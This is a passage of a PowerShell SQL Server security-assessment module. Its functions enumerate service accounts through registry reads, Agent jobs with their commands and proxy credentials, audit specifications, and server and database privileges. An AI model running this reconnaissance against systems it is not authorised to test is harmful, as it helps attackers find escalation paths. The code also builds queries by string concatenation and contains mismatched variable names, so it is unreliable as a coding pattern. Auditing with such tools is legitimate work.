        $WinGroups = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($WinCurrentUser)

        # Check if the current windows user/groups are local administrators / process is elevated
        $WinRoleCheck = [System.Security.Principal.WindowsBuiltInRole]::Administrator        

        # Return true or false
        $WinGroups.IsInRole($WinRoleCheck)
    }

    End
    {
    }
}

Function  Get-SQLServiceAccount
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServiceAccount = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq 'Yes')
        {
            $SysadminSetup = "
                -- Get SQL Server Browser - Static Location
                EXECUTE       master.dbo.xp_instance_regread
                @rootkey      = N'HKEY_LOCAL_MACHINE',
                @key          = N'SYSTEM\CurrentControlSet\Services\SQLBrowser',
                @value_name   = N'ObjectName',
                @value        = @BrowserLogin OUTPUT

                -- Get SQL Server Writer - Static Location
                EXECUTE       master.dbo.xp_instance_regread
                @rootkey      = N'HKEY_LOCAL_MACHINE',
                @key          = N'SYSTEM\CurrentControlSet\Services\SQLWriter',
                @value_name   = N'ObjectName',
                @value        = @WriterLogin OUTPUT

                -- Get MSOLAP - Calculated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @MSOLAPInstance,
                N'ObjectName',@AnalysisLogin OUTPUT

                -- Get Reporting - Calculated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @ReportInstance,
                N'ObjectName',@ReportLogin OUTPUT

                -- Get SQL Server DTS Server / Analysis - Calulated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @IntegrationVersion,
            N'ObjectName',@IntegrationDtsLogin OUTPUT"

            $SysadminQuery = '	,[BrowserLogin] = @BrowserLogin,
                [WriterLogin] = @WriterLogin,
                [AnalysisLogin] = @AnalysisLogin,
                [ReportLogin] = @ReportLogin,
            [IntegrationLogin] = @IntegrationDtsLogin'
        }
        else
        {
            $SysadminSetup = ''
            $SysadminQuery = ''
        }

        # Define Query
        $Query = "  -- Setup variables
            DECLARE		@SQLServerInstance	VARCHAR(250)
            DECLARE		@MSOLAPInstance		VARCHAR(250)
            DECLARE		@ReportInstance 	VARCHAR(250)
            DECLARE		@AgentInstance	 	VARCHAR(250)
            DECLARE		@IntegrationVersion	VARCHAR(250)
            DECLARE		@DBEngineLogin		VARCHAR(100)
            DECLARE		@AgentLogin		VARCHAR(100)
            DECLARE		@BrowserLogin		VARCHAR(100)
            DECLARE     	@WriterLogin		VARCHAR(100)
            DECLARE		@AnalysisLogin		VARCHAR(100)
            DECLARE		@ReportLogin		VARCHAR(100)
            DECLARE		@IntegrationDtsLogin	VARCHAR(100)

            -- Get Service Paths for default and name instance
            if @@SERVICENAME = 'MSSQLSERVER' or @@SERVICENAME = HOST_NAME()
            BEGIN
            -- Default instance paths
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLServerOLAPService'
            set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer'
            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLSERVERAGENT'
            set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
            END
            ELSE
            BEGIN
            -- Named instance paths
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + cast(@@SERVICENAME as varchar(250))
            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSOLAP$' + cast(@@SERVICENAME as varchar(250))
            set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer$' + cast(@@SERVICENAME as varchar(250))
            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLAgent$' + cast(@@SERVICENAME as varchar(250))
            set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
            END

            -- Get SQL Server - Calculated
            EXECUTE		master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@DBEngineLogin OUTPUT

            -- Get SQL Server Agent - Calculated
            EXECUTE		master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @AgentInstance,
            N'ObjectName',@AgentLogin OUTPUT

            $SysadminSetup

            -- Dislpay results
            SELECT		'$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            [DBEngineLogin] = @DBEngineLogin,
            [AgentLogin] = @AgentLogin
        $SysadminQuery"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblServiceAccount = $TblServiceAccount + $TblResults
    }

    End
    {
        # Return data
        $TblServiceAccount
    }
}

Function  Get-SQLAgentJob
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs for specific subsystems.')]
         [ValidateSet("TSQL","PowerShell","CMDEXEC","PowerShell","ActiveScripting","ANALYSISCOMMAND","ANALYSISQUERY","Snapshot","Distribution","LogReader","Merge","QueueReader")]
        [String]$SubSystem,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs that have a command that includes a specific keyword.')]
        [String]$Keyword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a proxy credentials.')]
        [Switch]$UsingProxyCredential,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a specific proxy credential.')]
        [String]$ProxyCredential,
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        if(-not $SuppressVerbose){
            Write-Verbose -Message "SQL Server Agent Job Search Starting..."
        }

        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')     
        $null = $TblResults.Columns.Add('DatabaseName')
        $null = $TblResults.Columns.Add('Job_Id')                                                                                                                                                                                        
        $null = $TblResults.Columns.Add('Job_Name')                                                                                                                                                                                                 
        $null = $TblResults.Columns.Add('Job_Description')  
        $null = $TblResults.Columns.Add('Job_Owner')
        $null = $TblResults.Columns.Add('Proxy_Id')  
        $null = $TblResults.Columns.Add('Proxy_Credential')                                                                                                                                                                                                          
        $null = $TblResults.Columns.Add('Date_Created') 
        $null = $TblResults.Columns.Add('Last_Run_Date')
        $null = $TblResults.Columns.Add('Enabled')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
        $null = $TblResults.Columns.Add('Server')                                                                                                                                                                                        
        $null = $TblResults.Columns.Add('Step_Name')
        $null = $TblResults.Columns.Add('SubSystem')
        $null = $TblResults.Columns.Add('Command')          
        
        # Setup SubSystem filter
        if($SubSystem)
        {
            $SubSystemFilter = " and steps.subsystem like '$SubSystem'"
        }
        else
        {
            $SubSustemFilter = ''
        }    
        
        # Setup Command Keyword filter
        if($Keyword)
        {
            $KeywordFilter = " and steps.command like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }   

        # Setup filter to only return jobs with proxy cred
        if($UsingProxyCredential)
        {
            $UsingProxyCredFilter = " and steps.proxy_id > 0"
        }
        else
        {
            $UsingProxyCredFilter = ''
        } 
        
        # Setup filter to only return jobs with specific proxy cred
        if($ProxyCredential)
        {
            $ProxyCredFilter = " and proxies.name like '$ProxyCredential'"
        }
        else
        {
            $ProxyCredFilter = ''
        }                                                                                                                                                                                                 
    }

    Process
    {
        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
        }

        # Attempt connection
        try
        {
            # Open connection
            $Connection.Open()
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."                
            }

            # Get some information about current context
            $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $CurrentLogin = $ServerInfo.CurrentLogin
            $ComputerName = $ServerInfo.ComputerName
            $Sysadmin = $ServerInfo.IsSysadmin

            # Check if Agent Job service is running
            $IsAgentServiceEnabled = Get-SQLQuery -Instance $Instance -Query "SELECT 1 FROM sysprocesses WHERE LEFT(program_name, 8) = 'SQLAgent'" -Username $Username -Password $Password -SuppressVerbose
            if ($IsAgentServiceEnabled)
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - SQL Server Agent service enabled."
                }
            }
            else
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - SQL Server Agent service has not been started."
                }
            }

            # Get logins that have SQL Agent roles
            # https://msdn.microsoft.com/en-us/library/ms188283.aspx
            $AddJobPrivs = Get-SQLDatabaseRoleMember -Username $Username -Password $Password -Instance $Instance -DatabaseName msdb  -SuppressVerbose| ForEach-Object { 
                if($_.RolePrincipalName -match "SQLAgentUserRole|SQLAgentReaderRole|SQLAgentOperatorRole") {
                    if ($_.PrincipalName -eq $CurrentLogin) { $_ }
                }
            }

            if($AgentJobPrivs -or ($Sysadmin -eq "Yes"))
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - Attempting to list existing agent jobs as $CurrentLogin."
                }


                # Reference: https://msdn.microsoft.com/en-us/library/ms189817.aspx
                $Query = "SELECT 	steps.database_name,
	                            job.job_id as [JOB_ID],
	                            job.name as [JOB_NAME],
	                            job.description as [JOB_DESCRIPTION],
								SUSER_SNAME(job.owner_sid) as [JOB_OWNER],
								steps.proxy_id,
								proxies.name as [proxy_account],
	                            job.enabled,
	                            steps.server,
	                            job.date_created,   
                                steps.last_run_date,								                             
								steps.step_name,
								steps.subsystem,
	                            steps.command
                            FROM [msdb].[dbo].[sysjobs] job
                            INNER JOIN [msdb].[dbo].[sysjobsteps] steps        
	                            ON job.job_id = steps.job_id
							left join [msdb].[dbo].[sysproxies] proxies
							 on steps.proxy_id = proxies.proxy_id
                            WHERE 1=1
                            $KeywordFilter
                            $SubSystemFilter
                            $ProxyCredFilter
                            $UsingProxyCredFilter"

                # Execute Query
                $result = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
                
                # Check the results                                
                if(!($result)) {
                    Write-Verbose -Message "$Instance : - Either no jobs exist or the current login ($CurrentLogin) doesn't have the privileges to view them."
                    return
                }

                # Get number of results
                $AgentJobCount = $result.rows.count
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - $AgentJobCount agent jobs found."
                }
                

                # Update data table
                $result | 
                ForEach-Object{
                    $null = $TblResults.Rows.Add($ComputerName,
                    $Instance,
                    $_.database_name,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
                    $_.JOB_ID,                                                                                                                                                                                        
                    $_.JOB_NAME, 
                    $_.JOB_DESCRIPTION,                                                                                                                                                                                                         
                    $_.JOB_OWNER,
                    $_.proxy_id,    
                    $_.proxy_account, 
                    $_.date_created,
                    $_.last_run_date,                                                                                                                                                                                  
                    $_.enabled,                                                                                                                                                                                                     
                    $_.server,                                                                                                                                                                                        
                    $_.step_name,
                    $_.subsystem,
                    $_.command)
                }
            }
            else
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - The current login ($CurrentLogin) does not have any agent privileges."
                }
                return
            }

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose()

        }
        catch
        {
            # Connection failed
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                #Write-Verbose  " Error: $ErrorMessage"
            }
        }        
    }

    End
    {
        if(-not $SuppressVerbose){
            Write-Verbose -Message "SQL Server Agent Job Search Complete."
        }

        # Get total count of jobs
        $TotalAgentCount = $TblResults.rows.Count

        # Get subsystem summary data
        $SummarySubSystem = $TblResults | Group-Object SubSystem | Select Name, Count | Sort-Object Count -Descending

        # Get proxy summary data
        $SummaryProxyAccount = $TblResults | Select-Object proxy_credential -Unique | Measure-Object | Select-Object Count -ExpandProperty Count

        # Get system summary data
        $SummaryServer = $TblResults | Select-Object ComputerName -Unique | Measure-Object |  Select-Object Count -ExpandProperty Count

        # Get instance summary data
        $SummaryInstance = $TblResults | Select-Object Instance -Unique | Measure-Object |  Select-Object Count -ExpandProperty Count

        if(-not $SuppressVerbose){
            Write-Verbose -Message "---------------------------------"
            Write-Verbose -Message "Agent Job Summary" 
            Write-Verbose -Message "---------------------------------"
            Write-Verbose -Message " $TotalAgentCount jobs found"
            Write-Verbose -Message " $SummaryServer affected systems"
            Write-Verbose -Message " $SummaryInstance affected SQL Server instances"
            Write-Verbose -Message " $SummaryProxyAccount proxy credentials used"

            Write-Verbose -Message "---------------------------------"
            Write-Verbose -Message "Agent Job Summary by SubSystem" 
            Write-Verbose -Message "---------------------------------"
            $SummarySubSystem | 
            ForEach-Object {
                $SubSystem_Name = $_.Name
                $SubSystem_Count = $_.Count
                Write-Verbose -Message " $SubSystem_Count $SubSystem_Name Jobs"
            }
            Write-Verbose -Message " $TotalAgentCount Total"
            Write-Verbose -Message "---------------------------------"
        }

        # Return data
        $TblResults
    }
}

Function  Get-SQLDBSpec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$AuditName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$AuditSpecification,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$AuditAction,



        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblAuditDatabaseSpec = New-Object -TypeName System.Data.DataTable

        # Setup audit name filter
        if($AuditName)
        {
            $AuditNameFilter = " and a.name like '%$AuditName%'"
        }
        else
        {
            $AuditNameFilter = ''
        }

        # Setup spec name filter
        if($AuditSpecification)
        {
            $SpecNameFilter = " and s.name like '%$AuditSpecification%'"
        }
        else
        {
            $SpecNameFilter = ''
        }

        # Setup action name filter
        if($AuditAction)
        {
            $ActionNameFilter = " and d.audit_action_name like '%$AuditAction%'"
        }
        else
        {
            $ActionNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }


        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }


        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            audit_id as [AuditId],
            a.name as [AuditName],
            s.name as [AuditSpecification],
            d.audit_action_id as [AuditActionId],
            d.audit_action_name as [AuditAction],
	        d.major_id,
	        OBJECT_NAME(d.major_id) as object,	
            s.is_state_enabled,
            d.is_group,
            s.create_date,
            s.modify_date,
            d.audited_result
            FROM sys.server_audits AS a
            JOIN sys.database_audit_specifications AS s
            ON a.audit_guid = s.audit_guid
            JOIN sys.database_audit_specification_details AS d
            ON s.database_specification_id = d.database_specification_id WHERE 1=1
            $AuditNameFilter
            $SpecNameFilter
        $ActionNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

        # Append results
        $TblAuditDatabaseSpec = $TblAuditDatabaseSpec + $TblResults
    }

    End
    {
        # Return data
        $TblAuditDatabaseSpec
    }
}


Function  Get-SQLAuditServerSpec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$AuditName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$AuditSpecification,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$AuditAction,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblAuditServerSpec = New-Object -TypeName System.Data.DataTable

        # Setup audit name filter
        if($AuditName)
        {
            $AuditNameFilter = " and a.name like '%$AuditName%'"
        }
        else
        {
            $AuditNameFilter = ''
        }

        # Setup spec name filter
        if($AuditSpecification)
        {
            $SpecNameFilter = " and s.name like '%$AuditSpecification%'"
        }
        else
        {
            $SpecNameFilter = ''
        }

        # Setup action name filter
        if($AuditAction)
        {
            $ActionNameFilter = " and d.audit_action_name like '%$AuditAction%'"
        }
        else
        {
            $ActionNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            audit_id as [AuditId],
            a.name as [AuditName],
            s.name as [AuditSpecification],
            d.audit_action_name as [AuditAction],
            s.is_state_enabled,
            d.is_group,
            d.audit_action_id as [AuditActionId],
            s.create_date,
            s.modify_date
            FROM sys.server_audits AS a
            JOIN sys.server_audit_specifications AS s
            ON a.audit_guid = s.audit_guid
            JOIN sys.server_audit_specification_details AS d
            ON s.server_specification_id = d.server_specification_id WHERE 1=1
            $AuditNameFilter
            $SpecNameFilter
        $ActionNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

        # Append results
        $TblAuditServerSpec  = $TblAuditServerSpec  + $TblResults
    }

    End
    {
        # Return data
        $TblAuditServerSpec
    }
}


Function  Get-SQLServerPriv
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name.')]
        [string]$PermissionName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerPrivs = New-Object -TypeName System.Data.DataTable

        # Setup $PermissionName filter
        if($PermissionName)
        {
            $PermissionNameFilter = " WHERE PER.permission_name like '$PermissionName'"
        }
        else
        {
            $PermissionNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            GRE.name as [GranteeName],
            GRO.name as [GrantorName],
            PER.class_desc as [PermissionClass],
            PER.permission_name as [PermissionName],
            PER.state_desc as [PermissionState],
            COALESCE(PRC.name, EP.name, N'') as [ObjectName],
            COALESCE(PRC.type_desc, EP.type_desc, N'') as [ObjectType]
            FROM [sys].[server_permissions] as PER
            INNER JOIN sys.server_principals as GRO
            ON PER.grantor_principal_id = GRO.principal_id
            INNER JOIN sys.server_principals as GRE
            ON PER.grantee_principal_id = GRE.principal_id
            LEFT JOIN sys.server_principals as PRC
            ON PER.class = 101 AND PER.major_id = PRC.principal_id
            LEFT JOIN sys.endpoints AS EP
            ON PER.class = 105 AND PER.major_id = EP.endpoint_id
            $PermissionNameFilter
        ORDER BY GranteeName,PermissionName;"

        # Execute Query
        $TblServerPrivsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append data as needed
        $TblServerPrivs = $TblServerPrivs + $TblServerPrivsTemp
    }

    End
    {
        # Return data
        $TblServerPrivs
    }
}


Function  Get-SQLDatabasePriv
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name to filter for.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name to filter for.')]
        [string]$PermissionName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission type to filter for.')]
        [string]$PermissionType,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name for grantee to filter for.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Don't select permissions for default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabasePrivs = New-Object -TypeName System.Data.DataTable

        # Setup PermissionName filter
        if($PermissionName)
        {
            $PermissionNameFilter = " and pm.permission_name like '$PermissionName'"
        }
        else
        {
            $PermissionNameFilter = ''
        }

        # Setup PermissionName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and rp.name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }

        # Setup PermissionType filter
        if($PermissionType)
        {
            $PermissionTypeFilter = " and pm.class_desc like '$PermissionType'"
        }
        else
        {
            $PermissionTypeFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get the privs for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Set DatabaseName filter
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                rp.name as [PrincipalName],
                rp.type_desc as [PrincipalType],
                pm.class_desc as [PermissionType],
                pm.permission_name as [PermissionName],
                pm.state_desc as [StateDescription],
                ObjectType = CASE
                WHEN obj.type_desc IS NULL
                OR obj.type_desc = 'SYSTEM_TABLE' THEN
                pm.class_desc
                ELSE
                obj.type_desc
                END,
                [ObjectName] = Isnull(ss.name, Object_name(pm.major_id))
                FROM   $DbName.sys.database_principals rp
                INNER JOIN $DbName.sys.database_permissions pm
                ON pm.grantee_principal_id = rp.principal_id
                LEFT JOIN $DbName.sys.schemas ss
                ON pm.major_id = ss.schema_id
                LEFT JOIN $DbName.sys.objects obj
                ON pm.[major_id] = obj.[object_id] WHERE 1=1
                $PermissionTypeFilter
                $PermissionNameFilter
            $PrincipalNameFilter"

